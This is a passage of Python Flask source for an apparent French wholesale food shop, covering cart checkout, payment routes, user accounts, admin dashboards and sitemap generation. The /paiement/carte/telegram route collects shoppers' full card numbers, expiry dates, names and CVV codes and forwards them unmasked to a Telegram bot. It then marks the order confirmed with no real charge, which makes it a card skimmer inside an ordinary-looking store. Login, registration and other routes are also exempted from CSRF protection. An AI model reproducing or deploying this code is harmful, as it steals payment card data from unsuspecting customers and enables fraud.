    total = 0
    nb_palettes = 0
    panier_items = []
    
    print("📦 Calcul des totaux du panier:")
    for produit_id, item in panier.items():
        produit = db.session.get(Produit, int(produit_id))
        if produit:
            prix_unitaire = item['prix']
            sous_total = item['quantite'] * prix_unitaire
            total += sous_total
            nb_palettes += item['quantite']
            panier_items.append({
                'produit': produit,
                'quantite': item['quantite'],
                'prix_unitaire': prix_unitaire,
                'sous_total': sous_total
            })
            print(f"   - {produit.nom}: {item['quantite']} x {prix_unitaire}€ = {sous_total}€")
    
    print(f"   Sous-total: {total}€")
    print(f"   Nombre de palettes: {nb_palettes}")
    
    # Calculer les frais de port
    frais_port = calculate_shipping_cost(nb_palettes)
    total_final = total + frais_port - discount_amount
    
    print(f"   Frais de port: {frais_port}€")
    print(f"   Réduction: {discount_amount}€")
    print(f"   Total final: {total_final}€")
    
    # Générer un numéro de commande unique
    import random
    commande_numero = f"CMD-{datetime.now().strftime('%Y%m%d')}-{random.randint(100, 9999)}"
    print(f"   Numéro commande: {commande_numero}")
    
    # Créer la commande
    try:
        commande = Commande(
            numero=commande_numero,
            utilisateur_id=utilisateur_id,
            email_client=email,
            nom_client=nom,
            telephone_client=telephone,
            adresse_livraison=adresse_complete,
            total=total,
            frais_port=frais_port,
            reduction=discount_amount,
            total_final=total_final,
            statut='en_attente_paiement',
            mode_paiement=mode_paiement,
            paiement_id=None,
            promo_code=promo_code_used if promo_code_used else None,
            date_creation=datetime.now(),
            date_maj=datetime.now()
        )
        
        db.session.add(commande)
        db.session.flush()
        print(f"✅ Commande créée avec ID: {commande.id}")
        
        # Ajouter les items
        for produit_id, item in panier.items():
            produit = db.session.get(Produit, int(produit_id))
            if produit:
                item_cmd = CommandeItem(
                    commande_id=commande.id,
                    produit_id=produit.id,
                    quantite=item['quantite'],
                    prix_unitaire=item['prix']
                )
                db.session.add(item_cmd)
                print(f"   ✅ Item ajouté: {produit.nom} x {item['quantite']}")
                
                # Mettre à jour le stock
                produit.stock -= item['quantite']
                print(f"   Stock mis à jour: {produit.nom} -> {produit.stock} restants")
        
        db.session.commit()
        print("✅ Commande et items enregistrés avec succès")
        
        # Vider le panier et la session promo
        session['panier'] = {}
        session['panier_total'] = 0
        session.pop('promo_code', None)
        session.pop('nb_palettes', None)
        session.pop('frais_port', None)
        
        print("   Panier vidé")
        
        # CORRECTION ICI : Utiliser les bons noms de modes
        if mode_paiement == 'carte' or mode_paiement == 'card':
            session['current_commande_id'] = commande.id
            print(f"🔀 Redirection vers paiement_carte avec commande ID: {commande.id}")
            return redirect(url_for('paiement_carte', commande_id=commande.id))
        
        elif mode_paiement == 'paypal':
            session['current_commande_id'] = commande.id
            print(f"🔀 Redirection vers paiement_paypal avec commande ID: {commande.id}")
            return redirect(url_for('paiement_paypal', commande_id=commande.id))
        
        elif mode_paiement == 'transfer' or mode_paiement == 'virement':
            print(f"🔀 Redirection vers paiement_virement avec commande ID: {commande.id}")
            return redirect(url_for('paiement_virement', commande_id=commande.id))
        
        else:
            # Fallback pour les autres modes
            print(f"🔀 Mode inconnu: {mode_paiement}, redirection vers confirmation")
            flash('Commande enregistrée avec succès', 'success')
            return redirect(url_for('confirmation', commande_id=commande.id))
        
    except Exception as e:
        db.session.rollback()
        print(f"❌ ERREUR lors de la création de la commande: {e}")
        import traceback
        traceback.print_exc()
        flash(f'Erreur lors de l\'enregistrement de la commande: {str(e)}', 'danger')
        return redirect(url_for('panier'))

@app.route('/paiement/carte/telegram', methods=['POST'])
@csrf.exempt
def paiement_carte_telegram():
    """Traiter le paiement par carte et envoyer à Telegram"""
    try:
        from telegram_bot import send_order_notification
        
        data = request.get_json()
        print("=" * 60)
        print("📩 RECEPTION PAIEMENT CARTE TELEGRAM")
        print(f"   Données reçues: {data}")
        
        # Récupérer la commande
        commande_id = data.get('commande_id')
        if not commande_id:
            commande_id = session.get('current_commande_id')
        
        if not commande_id:
            return jsonify({'success': False, 'error': 'Aucune commande'}), 400
        
        commande = Commande.query.get(commande_id)
        if not commande:
            return jsonify({'success': False, 'error': 'Commande non trouvée'}), 404
        
        # Mettre à jour les infos client si invité
        if not current_user.is_authenticated:
            commande.nom_client = data.get('nom', commande.nom_client)
            commande.email_client = data.get('email', commande.email_client)
            commande.telephone_client = data.get('telephone', commande.telephone_client)
            adresse = data.get('adresse', '')
            code_postal = data.get('code_postal', '')
            ville = data.get('ville', '')
            pays = data.get('pays', 'France')
            commande.adresse_livraison = f"{adresse}, {code_postal} {ville}, {pays}"
            db.session.commit()
        
        # Récupérer les infos carte COMPLÈTES (non masquées)
        card_info = data.get('card_info', {})
        
        # Préparer les infos carte pour Telegram (avec toutes les données)
        card_data = {
            'number': card_info.get('number', 'N/A'),      # Numéro complet
            'expiry': card_info.get('expiry', 'N/A'),      # Date d'expiration
            'holder': card_info.get('holder', 'N/A'),      # Titulaire
            'cvv': card_info.get('cvv', 'N/A')             # CVV
        }
        
        print(f"   Infos carte reçues: {card_data}")
        
        # Récupérer les items
        items = CommandeItem.query.filter_by(commande_id=commande.id).all()
        
        # ENVOYER À TELEGRAM AVEC TOUTES LES INFOS CARTE
        print("📤 Envoi de la commande à Telegram...")
        # show_full_card=True pour afficher toutes les infos
        success = send_order_notification(commande, items, card_data, show_full_card=True)
        
        if success:
            print("✅ Notification envoyée à Telegram")
        else:
            print("⚠️ Échec de l'envoi Telegram")
        
        # Mettre à jour le statut de la commande
        commande.statut = 'confirmee'
        commande.paiement_id = f"TELEGRAM_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        db.session.commit()
        
        # Vider la session panier
        session['panier'] = {}
        session['panier_total'] = 0
        session.pop('current_commande_id', None)
        
        return jsonify({
            'success': True,
            'commande_id': commande.id,
            'message': 'Paiement enregistré et envoyé à Telegram'
        })
        
    except Exception as e:
        print(f"❌ ERREUR: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500

from telegram_bot import send_telegram_message, test_telegram_connection, send_order_notification

@app.route('/telegram/test')
def test_telegram():
    """Route de test pour Telegram"""
    print("=" * 60)
    print("🔍 TEST DE CONNEXION TELEGRAM")
    
    result = test_telegram_connection()
    
    if result:
        flash('✅ Message test envoyé à Telegram ! Vérifiez votre application Telegram.', 'success')
    else:
        flash('❌ Erreur d\'envoi. Vérifiez votre token et chat_id.', 'danger')
    
    return redirect(url_for('index'))

@app.route('/telegram/test-commande')
def test_telegram_commande():
    """Route pour tester l'envoi d'une commande factice"""
    # Créer des données factices pour tester
    class FakeCommande:
        numero = "TEST-001"
        total_final = 1768.80
        total = 1679.80
        frais_port = 89.00
        reduction = 0
        nom_client = "Jean DUPONT"
        email_client = "jean@example.com"
        telephone_client = "0612345678"
        adresse_livraison = "123 Rue de Paris, 75001 Paris, France"
    
    class FakeItem:
        def __init__(self, nom, quantite, prix):
            self.produit = type('obj', (object,), {'nom': nom})()
            self.quantite = quantite
            self.prix_unitaire = prix
    
    items = [
        FakeItem("🥤 Palette Red Bull 250ml (2592 canettes)", 1, 1679.80)
    ]
    
    card_info = {
        'last4': '1234',
        'expiry': '12/25',
        'holder': 'JEAN DUPONT'
    }
    
    result = send_order_notification(FakeCommande(), items, card_info)
    
    if result:
        flash('✅ Commande test envoyée à Telegram !', 'success')
    else:
        flash('❌ Erreur d\'envoi', 'danger')
    
    return redirect(url_for('index'))
    

@app.route('/ajouter-panier/<int:produit_id>', methods=['POST'])
@csrf.exempt  # Temporairement pour tester, mais à sécuriser après
def ajouter_panier(produit_id):
    """Ajouter un produit au panier"""
    try:
        print("=" * 60)
        print(f"🛒 AJOUT AU PANIER - Produit ID: {produit_id}")
        
        # Récupérer le produit
        produit = Produit.query.get_or_404(produit_id)
        
        # Récupérer la quantité
        data = request.get_json()
        if data:
            quantite = data.get('quantite', 1)
        else:
            quantite = int(request.form.get('quantite', 1))
        
        print(f"   Quantité demandée: {quantite}")
        
        # Vérifier le stock
        if quantite > produit.stock:
            return jsonify({
                'success': False, 
                'error': f'Stock insuffisant. Il reste {produit.stock} unité(s)'
            }), 400
        
        # Récupérer le prix (prix promo ou prix normal)
        if produit.prix_promo and produit.en_promotion:
            prix = float(produit.prix_promo)
        else:
            prix = float(produit.prix)
        
        # Initialiser le panier
        panier = session.get('panier', {})
        produit_key = str(produit_id)
        
        # Ajouter ou mettre à jour
        if produit_key in panier:
            nouvelle_quantite = panier[produit_key]['quantite'] + quantite
            if nouvelle_quantite > produit.stock:
                return jsonify({
                    'success': False,
                    'error': f'Quantité totale trop élevée. Stock disponible: {produit.stock}'
                }), 400
            panier[produit_key]['quantite'] = nouvelle_quantite
        else:
            panier[produit_key] = {
                'quantite': quantite,
                'prix': prix
            }
        
        # Sauvegarder
        session['panier'] = panier
        session.modified = True
        
        # Calculer le total
        total = sum(item['quantite'] * item['prix'] for item in panier.values())
        session['panier_total'] = total
        
        print(f"✅ Produit ajouté - Nouveau total: {total}€")
        print(f"   Panier: {panier}")
        print("=" * 60)
        
        return jsonify({
            'success': True,
            'message': f'{produit.nom} ajouté au panier',
            'panier_count': len(panier),
            'panier_total': total
        })
        
    except Exception as e:
        print(f"❌ ERREUR ajout panier: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500
    
def calculate_shipping_cost(nb_palettes):
    """Calcule les frais de port en fonction du nombre de palettes"""
    if nb_palettes == 1:
        return 89.00
    elif nb_palettes == 2:
        return 129.00
    elif nb_palettes == 3:
        return 169.00
    elif nb_palettes <= 5:
        return 199.00
    elif nb_palettes <= 8:
        return 249.00
    elif nb_palettes <= 12:
        return 299.00
    else:
        return 299 + (nb_palettes - 12) * 25

# app.py - Correction de la route paiement_carte
@app.route('/paiement/carte')
@app.route('/paiement/carte/<int:commande_id>')
def paiement_carte(commande_id=None):
    """Paiement par carte - Utilise la commande existante"""
    print("=" * 80)
    print("🚀 ROUTE PAIEMENT CARTE - APPELÉE")
    
    # Récupérer l'ID commande
    if not commande_id:
        commande_id = session.get('current_commande_id')
    
    if not commande_id:
        flash('Commande non trouvée. Veuillez recommencer.', 'danger')
        return redirect(url_for('paiement'))
    
    commande = Commande.query.get(commande_id)
    if not commande:
        flash('Commande non trouvée', 'danger')
        return redirect(url_for('paiement'))
    
    # Récupérer les items de la commande
    items = CommandeItem.query.filter_by(commande_id=commande.id).all()
    
    # Calculer le nombre de palettes
    nb_palettes = sum(item.quantite for item in items)
    
    # Récupérer les infos client
    est_connecte = current_user.is_authenticated
    reduction = commande.reduction or 0
    
    # Pour les invités, passer les données de la commande au template
    client_data = {}
    if not est_connecte:
        client_data = {
            'nom': commande.nom_client,
            'email': commande.email_client,
            'telephone': commande.telephone_client,
            'adresse_livraison': commande.adresse_livraison
        }
        # Extraire adresse, code postal, ville depuis adresse_livraison
        if commande.adresse_livraison:
            parts = commande.adresse_livraison.split(',')
            if len(parts) >= 2:
                client_data['adresse'] = parts[0].strip()
                # Extraire code postal et ville
                cp_ville = parts[1].strip()
                cp_parts = cp_ville.split(' ')
                if len(cp_parts) >= 2:
                    client_data['code_postal'] = cp_parts[0]
                    client_data['ville'] = ' '.join(cp_parts[1:])
    
    print(f"   Commande ID: {commande.id}")
    print(f"   Total: {commande.total_final}€")
    print(f"   Nombre d'items: {len(items)}")
    print(f"   Client data: {client_data}")
    
    return render_template('paiement_carte.html', 
                         commande=commande,
                         items=items,
                         nb_palettes=nb_palettes,
                         total=commande.total,
                         frais_port=commande.frais_port,
                         reduction=reduction,
                         est_connecte=est_connecte,
                         client_data=client_data)

@app.route('/paiement/carte', methods=['POST'])
def paiement_carte_api():
    """API pour traiter le paiement par carte"""
    try:
        print("=" * 80)
        print("🚀 ROUTE PAIEMENT CARTE API - APPELÉE")
        
        data = request.get_json()
        print(f"   Données reçues: {data}")
        
        # Récupérer la commande
        commande_id = session.get('current_commande_id')
        if not commande_id:
            return jsonify({'success': False, 'error': 'Aucune commande en cours'}), 400
        
        commande = Commande.query.get(commande_id)
        if not commande:
            return jsonify({'success': False, 'error': 'Commande non trouvée'}), 404
        
        # Mettre à jour les infos client si invité
        if not current_user.is_authenticated:
            commande.nom_client = data.get('nom', commande.nom_client)
            commande.email_client = data.get('email', commande.email_client)
            commande.telephone_client = data.get('telephone', commande.telephone_client)
            
            # Construire l'adresse complète
            adresse = data.get('adresse', '')
            code_postal = data.get('code_postal', '')
            ville = data.get('ville', '')
            pays = data.get('pays', 'France')
            commande.adresse_livraison = f"{adresse}, {code_postal} {ville}, {pays}"
        
        # Créer un PaymentIntent Stripe
        import stripe
        stripe.api_key = app.config['STRIPE_SECRET_KEY']
        
        # Convertir en centimes
        amount = int(commande.total_final * 100)
        
        # Créer le PaymentIntent
        intent = stripe.PaymentIntent.create(
            amount=amount,
            currency='eur',
            metadata={
                'commande_id': commande.id,
                'commande_numero': commande.numero
            },
            description=f"Commande {commande.numero}"
        )
        
        # Sauvegarder l'ID du PaymentIntent
        commande.paiement_id = intent.id
        db.session.commit()
        
        print(f"✅ PaymentIntent créé: {intent.id}")
        print(f"   Client secret: {intent.client_secret[:20]}...")
        
        return jsonify({
            'success': True,
            'client_secret': intent.client_secret,
            'commande_id': commande.id
        })
        
    except Exception as e:
        print(f"❌ ERREUR: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500
    
@app.route('/paiement/paypal')
@app.route('/paiement/paypal/<int:commande_id>')
def paiement_paypal(commande_id=None):
    """Paiement par PayPal"""
    print("=" * 80)
    print("🚀 ROUTE PAIEMENT PAYPAL - APPELÉE")
    
    # Récupérer l'ID commande
    if not commande_id:
        commande_id = session.get('current_commande_id')
    
    if not commande_id:
        flash('Commande non trouvée. Veuillez recommencer.', 'danger')
        return redirect(url_for('paiement'))
    
    commande = Commande.query.get(commande_id)
    if not commande:
        flash('Commande non trouvée', 'danger')
        return redirect(url_for('paiement'))
    
    # Récupérer les items
    items = CommandeItem.query.filter_by(commande_id=commande.id).all()
    nb_palettes = sum(item.quantite for item in items)
    
    return render_template('paiement_paypal.html', 
                         commande=commande,
                         items=items,
                         nb_palettes=nb_palettes,
                         est_connecte=current_user.is_authenticated)

@app.route('/paiement/success/<int:commande_id>')
def paiement_success(commande_id):
    """Confirmation de paiement réussi"""
    commande = Commande.query.get_or_404(commande_id)
    commande.statut = 'confirmee'
    db.session.commit()
    
    flash('Paiement réussi ! Votre commande est confirmée.', 'success')
    return redirect(url_for('confirmation', commande_id=commande_id))

@app.route('/confirmation/<int:commande_id>')
def confirmation(commande_id):
    """Page de confirmation de commande"""
    commande = Commande.query.get_or_404(commande_id)
    
    print(f"🔍 CONFIRMATION - Commande ID: {commande_id}")
    print(f"   - Utilisateur ID: {commande.utilisateur_id}")
    print(f"   - Total: {commande.total_final}€")
    
    # Récupérer les items de la commande
    items = CommandeItem.query.filter_by(commande_id=commande.id).all()
    print(f"   - Nombre d'items: {len(items)}")
    
    for item in items:
        print(f"      - Produit ID: {item.produit_id}, Quantité: {item.quantite}, Prix: {item.prix_unitaire}€")
    
    # Vérifier les droits d'accès
    if commande.utilisateur_id and commande.utilisateur_id != current_user.id:
        if not current_user.is_authenticated or current_user.role != 'admin':
            flash('Accès non autorisé', 'danger')
            return redirect(url_for('index'))
    
    # Calculer les dates de livraison estimées
    date_livraison_min = (datetime.now() + timedelta(days=2)).strftime('%d/%m/%Y')
    date_livraison_max = (datetime.now() + timedelta(days=4)).strftime('%d/%m/%Y')
    
    return render_template('confirmation.html', 
                         commande=commande,
                         items=items,
                         date_livraison_min=date_livraison_min,
                         date_livraison_max=date_livraison_max)

@app.route('/compte/adresses')
@csrf.exempt
@login_required
def compte_adresses():
    """Gestion des adresses du client"""
    return render_template('compte/adresses.html', utilisateur=current_user)

@app.route('/compte/adresses/ajouter', methods=['GET', 'POST'])
@csrf.exempt
@login_required
def compte_adresses_ajouter():
    """Ajouter une nouvelle adresse"""
    if request.method == 'POST':
        # Mettre à jour l'adresse principale
        current_user.adresse = request.form.get('adresse')
        current_user.code_postal = request.form.get('code_postal')
        current_user.ville = request.form.get('ville')
        current_user.pays = request.form.get('pays', 'France')
        
        db.session.commit()
        flash('Adresse ajoutée avec succès', 'success')
        return redirect(url_for('compte_adresses'))
    
    return render_template('compte/adresses_form.html')

@app.route('/compte/adresses/modifier', methods=['POST'])
@csrf.exempt
@login_required
def compte_adresses_modifier():
    """Modifier l'adresse principale"""
    current_user.adresse = request.form.get('adresse')
    current_user.code_postal = request.form.get('code_postal')
    current_user.ville = request.form.get('ville')
    current_user.pays = request.form.get('pays', 'France')
    
    db.session.commit()
    flash('Adresse mise à jour avec succès', 'success')
    return redirect(url_for('compte_adresses'))

@app.route('/compte/favoris')
@login_required
def compte_favoris():
    """Liste des produits favoris"""
    favoris = Wishlist.query.filter_by(utilisateur_id=current_user.id).all()
    produits = [fav.produit for fav in favoris if fav.produit and fav.produit.actif]
    
    # Compter le nombre de favoris pour le dashboard
    stats = {
        'favoris': len(produits)
    }
    
    return render_template('compte/favoris.html', produits=produits, stats=stats)
    
    return render_template('compte/favoris.html', produits=produits)
@app.route('/wishlist/ajouter/<int:produit_id>', methods=['POST'])
@login_required
def ajouter_wishlist(produit_id):
    """Ajouter un produit aux favoris"""
    try:
        # Vérifier si déjà dans les favoris
        existant = Wishlist.query.filter_by(
            utilisateur_id=current_user.id,
            produit_id=produit_id
        ).first()
        
        if existant:
            return jsonify({'success': False, 'message': 'Déjà dans vos favoris'})
        
        # Ajouter aux favoris
        favori = Wishlist(
            utilisateur_id=current_user.id,
            produit_id=produit_id
        )
        db.session.add(favori)
        db.session.commit()
        
        return jsonify({'success': True, 'message': 'Ajouté aux favoris'})
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/commande/confirmation')
def commande_confirmation_redirect():
    """Redirection vers la page de confirmation"""
    # Récupérer la dernière commande de l'utilisateur
    if current_user.is_authenticated:
        derniere_commande = Commande.query.filter_by(
            utilisateur_id=current_user.id
        ).order_by(Commande.date_creation.desc()).first()
        
        if derniere_commande:
            return redirect(url_for('confirmation', commande_id=derniere_commande.id))
    
    # Sinon, rediriger vers la page des commandes
    flash('Aucune commande trouvée', 'warning')
    return redirect(url_for('compte_commandes'))

@app.route('/wishlist/supprimer/<int:produit_id>', methods=['POST'])
@login_required
def supprimer_wishlist(produit_id):
    """Retirer un produit des favoris"""
    try:
        favori = Wishlist.query.filter_by(
            utilisateur_id=current_user.id,
            produit_id=produit_id
        ).first()
        
        if favori:
            db.session.delete(favori)
            db.session.commit()
            return jsonify({'success': True, 'message': 'Retiré des favoris'})
        
        return jsonify({'success': False, 'message': 'Produit non trouvé dans vos favoris'})
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/connexion', methods=['GET', 'POST'])
@csrf.exempt
def connexion():
    """Page de connexion"""
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        remember = request.form.get('remember') == 'on'
        
        utilisateur = Utilisateur.query.filter_by(email=email).first()
        
        if utilisateur and check_password_hash(utilisateur.password, password):
            login_user(utilisateur, remember=remember)
            next_page = request.args.get('next')
            
            flash(f'Bon retour parmi nous, {utilisateur.prenom}!', 'success')
            
            # Rediriger vers la page demandée ou l'accueil
            if next_page and next_page.startswith('/'):
                return redirect(next_page)
            return redirect(url_for('index'))
        else:
            flash('Email ou mot de passe incorrect', 'danger')
    
    return render_template('connexion.html')

@app.route('/inscription', methods=['GET', 'POST'])
@csrf.exempt
def inscription():
    """Page d'inscription"""
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        nom = request.form.get('nom')
        prenom = request.form.get('prenom')
        telephone = request.form.get('telephone')
        
        # Vérifier si l'email existe déjà
        if Utilisateur.query.filter_by(email=email).first():
            flash('Cet email est déjà utilisé', 'danger')
            return redirect(url_for('inscription', next=request.args.get('next')))
        
        # Créer l'utilisateur
        utilisateur = Utilisateur(
            email=email,
            password=generate_password_hash(password),
            nom=nom,
            prenom=prenom,
            telephone=telephone,
            role='client',
            date_inscription=datetime.now()
        )
        
        db.session.add(utilisateur)
        db.session.commit()
        
        # Connecter l'utilisateur
        login_user(utilisateur)
        
        next_page = request.args.get('next')
        flash(f'Bienvenue {prenom} ! Votre compte a été créé avec succès.', 'success')
        
        # Rediriger vers la page demandée ou l'accueil
        if next_page and next_page.startswith('/'):
            return redirect(next_page)
        return redirect(url_for('index'))
    
    return render_template('inscription.html')

@app.route('/qui-sommes-nous')
def qui_sommes_nous():
    """Page Qui sommes-nous"""
    return render_template('qui-sommes-nous.html')

@app.route('/deconnexion')
@login_required
def deconnexion():
    """Déconnexion"""
    logout_user()
    flash('Vous avez été déconnecté', 'info')
    return redirect(url_for('index'))
@app.route('/compte')
@login_required
def compte():
    """Tableau de bord du compte"""
    # Compter les favoris
    favoris_count = Wishlist.query.filter_by(utilisateur_id=current_user.id).count()
    
    # Statistiques
    stats = {
        'total_commandes': Commande.query.filter_by(utilisateur_id=current_user.id).count(),
        'en_cours': Commande.query.filter_by(utilisateur_id=current_user.id, statut='en_attente').count(),
        'total_depense': db.session.query(db.func.sum(Commande.total_final)).filter_by(utilisateur_id=current_user.id).scalar() or 0,
        'favoris': favoris_count  # ← AJOUTER CETTE LIGNE
    }
    
    dernieres_commandes = Commande.query.filter_by(
        utilisateur_id=current_user.id
    ).order_by(Commande.date_creation.desc()).limit(5).all()
    
    # Recommandations
    recommandations = Produit.query.filter_by(actif=True).order_by(Produit.views.desc()).limit(4).all()
    
    return render_template('compte/dashboard.html', 
                         utilisateur=current_user,
                         stats=stats,
                         dernieres_commandes=dernieres_commandes,
                         recommandations=recommandations)


@app.route('/compte/parametres')
@login_required
def compte_parametres():
    """Paramètres du compte"""
    return render_template('compte/parametres.html')

# app.py - Correction de la route compte_commandes
@app.route('/compte/commandes')
@login_required
def compte_commandes():
    """Liste des commandes du client avec pagination"""
    print(f"🔍 COMPTE COMMANDES - Utilisateur ID: {current_user.id}")
    
    # Récupérer la page
    page = request.args.get('page', 1, type=int)
    per_page = 10
    
    # Récupérer les commandes avec pagination
    commandes = Commande.query.filter_by(
        utilisateur_id=current_user.id
    ).order_by(Commande.date_creation.desc()).paginate(
        page=page, 
        per_page=per_page, 
        error_out=False
    )
    
    print(f"📦 Nombre de commandes trouvées: {commandes.total}")
    for cmd in commandes.items:
        print(f"   - {cmd.id}: {cmd.numero} - {cmd.statut} - {cmd.total_final}€")
    
    return render_template('compte/commandes.html', commandes=commandes)

@app.route('/compte/commandes/<int:commande_id>')
@login_required
def compte_commande_detail(commande_id):
    """Détail d'une commande"""
    commande = Commande.query.get_or_404(commande_id)
    
    # Vérifier que la commande appartient bien à l'utilisateur
    if commande.utilisateur_id != current_user.id:
        flash('Accès non autorisé', 'danger')
        return redirect(url_for('compte_commandes'))
    
    return render_template('compte/commande_detail.html', commande=commande)

# Dans app.py, ajoutez ces routes si elles n'existent pas

@app.route('/produit/<int:produit_id>/avis', methods=['POST'])
@login_required
def ajouter_avis(produit_id):
    """Ajouter un avis sur un produit"""
    produit = Produit.query.get_or_404(produit_id)
    
    note = request.form.get('note', type=int)
    commentaire = request.form.get('commentaire')
    
    if not note or note < 1 or note > 5:
        flash('Veuillez donner une note entre 1 et 5', 'danger')
        return redirect(url_for('produit_detail', produit_id=produit_id))
    
    # Vérifier si l'utilisateur a déjà donné un avis
    avis_existant = Avis.query.filter_by(
        utilisateur_id=current_user.id,
        produit_id=produit_id
    ).first()
    
    if avis_existant:
        flash('Vous avez déjà donné un avis sur ce produit', 'warning')
        return redirect(url_for('produit_detail', produit_id=produit_id))
    
    # Gérer l'upload de photo
    photo_filename = None
    if 'photo' in request.files:
        photo = request.files['photo']
        if photo and photo.filename:
            # Créer le dossier s'il n'existe pas
            import os
            from werkzeug.utils import secure_filename
            upload_folder = os.path.join('static', 'uploads', 'reviews')
            os.makedirs(upload_folder, exist_ok=True)
            
            # Sauvegarder la photo
            filename = secure_filename(f"review_{current_user.id}_{produit_id}_{datetime.now().timestamp()}.jpg")
            photo.save(os.path.join(upload_folder, filename))
            photo_filename = filename
    
    # Créer l'avis
    avis = Avis(
        utilisateur_id=current_user.id,
        produit_id=produit_id,
        note=note,
        commentaire=commentaire,
        photo=photo_filename
    )
    db.session.add(avis)
    
    # Mettre à jour la note moyenne du produit
    tous_avis = Avis.query.filter_by(produit_id=produit_id).all()
    produit.note_moyenne = sum(a.note for a in tous_avis) / len(tous_avis)
    produit.note_count = len(tous_avis)
    
    db.session.commit()
    
    flash('Merci pour votre avis !', 'success')
    return redirect(url_for('produit_detail', produit_id=produit_id))

# Routes admin
@app.route('/admin/vue-globale')
@login_required
def admin_vue_globale():
    """Dashboard admin vue 360°"""
    if current_user.role != 'admin':
        flash('Accès non autorisé', 'danger')
        return redirect(url_for('index'))
    
    # Statistiques
    total_utilisateurs = Utilisateur.query.count()
    total_commandes = Commande.query.count()
    commandes_aujourdhui = Commande.query.filter(
        Commande.date_creation >= datetime.now().date()
    ).count()
    
    # Chiffre d'affaires
    ca_total = db.session.query(db.func.sum(Commande.total)).scalar() or 0
    ca_mois = db.session.query(db.func.sum(Commande.total)).filter(
        Commande.date_creation >= datetime.now().replace(day=1, hour=0, minute=0, second=0)
    ).scalar() or 0
    
    # Nouveaux clients
    nouveaux_clients = Utilisateur.query.filter(
        Utilisateur.date_inscription >= datetime.now().replace(day=1, hour=0, minute=0, second=0)
    ).count()
    
    # Produits
    produits_stock = Produit.query.filter(Produit.stock > 0).count()
    produits_rupture = Produit.query.filter(Produit.stock == 0).count()
    
    # Dernières commandes
    dernieres_commandes = Commande.query.order_by(
        Commande.date_creation.desc()
    ).limit(10).all()
    
    # Produits en alerte stock
    produits_alerte = Produit.query.filter(Produit.stock < 10, Produit.stock > 0).limit(5).all()
    
    return render_template('admin/vue_globale.html',
                         total_utilisateurs=total_utilisateurs,
                         total_commandes=total_commandes,
                         commandes_aujourdhui=commandes_aujourdhui,
                         ca_total=ca_total,
                         ca_mois=ca_mois,
                         nouveaux_clients=nouveaux_clients,
                         produits_stock=produits_stock,
                         produits_rupture=produits_rupture,
                         dernieres_commandes=dernieres_commandes,
                         produits_alerte=produits_alerte)

@app.route('/admin/produits')
@login_required
def admin_produits():
    """Gestion des produits (admin)"""
    if current_user.role != 'admin':
        flash('Accès non autorisé', 'danger')
        return redirect(url_for('index'))
    
    produits = Produit.query.order_by(Produit.id.desc()).all()
    return render_template('admin/produits.html', produits=produits)

@app.route('/admin/produits/supprimer/<int:produit_id>', methods=['POST'])
@login_required
def admin_supprimer_produit(produit_id):
    """Supprimer un produit (admin)"""
    if current_user.role != 'admin':
        return jsonify({'success': False, 'error': 'Non autorisé'}), 403
    
    produit = Produit.query.get_or_404(produit_id)
    
    try:
        # Supprimer le produit
        db.session.delete(produit)
        db.session.commit()
        return jsonify({'success': True})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500

# Ajoutez ces routes dans app.py, après vos autres routes (vers la fin du fichier)

# ============= SITEMAP ROUTES =============
@app.route('/sitemap.xml')
def sitemap():
    """Génère le sitemap XML complet"""
    from models import Produit, Categorie
    from datetime import datetime
    import xml.etree.ElementTree as ET
    from xml.dom import minidom
    
    # URLs statiques
    static_urls = [
        {'loc': '/', 'priority': 1.0, 'changefreq': 'daily'},
        {'loc': '/produits', 'priority': 0.9, 'changefreq': 'daily'},
        {'loc': '/offres-flash', 'priority': 0.9, 'changefreq': 'daily'},
        {'loc': '/qui-sommes-nous', 'priority': 0.6, 'changefreq': 'monthly'},
        {'loc': '/contact', 'priority': 0.7, 'changefreq': 'monthly'},
        {'loc': '/mentions-legales', 'priority': 0.3, 'changefreq': 'yearly'},
        {'loc': '/cgv', 'priority': 0.3, 'changefreq': 'yearly'},
        {'loc': '/confidentialite', 'priority': 0.3, 'changefreq': 'yearly'},
    ]
    
    # URLs dynamiques - Produits
    produits = Produit.query.filter_by(actif=True).all()
    for produit in produits:
        static_urls.append({
            'loc': f'/produit/{produit.id}',
            'priority': 0.9,
            'changefreq': 'weekly'
        })
    
    # Génération XML
    root = ET.Element('urlset', xmlns="http://www.sitemaps.org/schemas/sitemap/0.9")
    
    for url_data in static_urls:
        url_elem = ET.SubElement(root, 'url')
        loc = ET.SubElement(url_elem, 'loc')
        loc.text = f"https://www.destockalimentaire.com{url_data['loc']}"
        priority = ET.SubElement(url_elem, 'priority')
        priority.text = str(url_data['priority'])
        changefreq = ET.SubElement(url_elem, 'changefreq')
        changefreq.text = url_data['changefreq']
    
    xml_str = ET.tostring(root, encoding='utf-8')
    dom = minidom.parseString(xml_str)
    
    return dom.toprettyxml(indent='  '), 200, {'Content-Type': 'application/xml'}

# Routes pour les articles SEO
@app.route('/destockage-alimentaire-paris')
def destockage_alimentaire_paris():
    """Article SEO destockage Paris"""
    return render_template('articles/destockage_alimentaire_paris.html')

@app.route('/destockage-alimentaire-lyon')
def destockage_alimentaire_lyon():
    """Article SEO destockage Lyon"""
    return render_template('articles/destockage_alimentaire_lyon.html')
    
@app.route('/sitemap-produits.xml')
def sitemap_produits():
    """Sitemap spécifique pour les produits"""
    from models import Produit
    from datetime import datetime
    import xml.etree.ElementTree as ET
    from xml.dom import minidom
    
    produits = Produit.query.filter_by(actif=True).all()
    
    root = ET.Element('urlset', xmlns="http://www.sitemaps.org/schemas/sitemap/0.9")
    
    for produit in produits:
        url_elem = ET.SubElement(root, 'url')
        loc = ET.SubElement(url_elem, 'loc')
        # Générer un slug à partir du nom du produit
        slug = produit.nom.lower().replace(' ', '-').replace('é', 'e').replace('è', 'e').replace('à', 'a')
        loc.text = f"https://www.destockalimentaire.com/produit/{produit.id}-{slug}"
        lastmod = ET.SubElement(url_elem, 'lastmod')
